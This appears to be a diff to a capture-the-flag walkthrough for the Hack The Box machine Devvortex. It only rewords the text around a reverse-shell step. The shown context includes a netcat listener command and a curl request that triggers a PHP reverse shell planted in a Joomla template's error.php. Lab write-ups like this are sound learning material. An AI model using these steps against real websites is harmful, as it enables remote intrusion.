@@ -76,6 +76,7 @@ feroxbuster -u http://devvortex.htb
 Nothing interesting.
 
 ### Vhost Enumeration
+
 Lets see if we can find any vhost:
 
 ```shell
@@ -182,13 +183,13 @@ Now start our nc listener:
 nc -lvnp 8443
 ```
 
-Visit the following URL to trigger the URL:
+Visit the following URL to trigger the PHP reverse shell inside error.php:
 
 ```shell
 curl -k "http://dev.devvortex.htb/templates/cassiopeia/error.php/error"
 ```
 
-This will trigger our reverse shell and give us a response on our nc listener:
+After that, we will get a response on our nc listener:
 
 ```shell
 listening on [any] 8443 ...
